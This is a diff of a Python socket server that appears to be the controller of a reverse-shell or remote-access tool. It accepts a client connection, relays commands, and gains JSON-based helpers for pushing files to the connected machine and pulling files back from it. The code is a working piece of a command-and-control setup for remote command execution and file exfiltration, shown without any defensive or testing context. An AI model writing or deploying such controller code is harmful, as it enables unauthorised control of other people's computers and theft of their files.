@@ -23,7 +23,19 @@ print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
 client_socket, client_address = server.accept()
 print(Fore.GREEN + f"Connection established with {client_address}")
 
-# Helper functions for upload and download
+def send_json(socket, data):
+    json_data = json.dumps(data)
+    socket.send(json_data.encode())
+
+def receive_json(socket):
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + socket.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
+
 def write_file(path, content):
     with open(path, "wb") as file:
         file.write(base64.b64decode(content))
@@ -52,14 +64,19 @@ try:
 
         # Handle upload and download commands
         if command.startswith("upload"):
-            _, file_path = command.split(" ", 1)
-            file_content = client_socket.recv(4096).decode("utf-8")
-            print(Fore.WHITE + write_file(file_path, file_content))
+            _, filepath = command.split(" ", 1)
+            file_content = read_file(filepath)
+            send_json(client_socket, ["upload", filepath, file_content])
+            response = receive_json(client_socket)
+            print(Fore.WHITE + response)
             continue
-        elif command.startswith("download"):
-            _, file_path = command.split(" ", 1)
-            file_content = read_file(file_path)
-            client_socket.sendall(file_content.encode("utf-8"))
+
+        if command.startswith("download"):
+            _, filepath = command.split(" ", 1)
+            send_json(client_socket, ["download", filepath])
+            response = receive_json(client_socket)
+            result = write_file(filepath, response)
+            print(Fore.WHITE + result)
             continue
 
         # Receive the output from the client
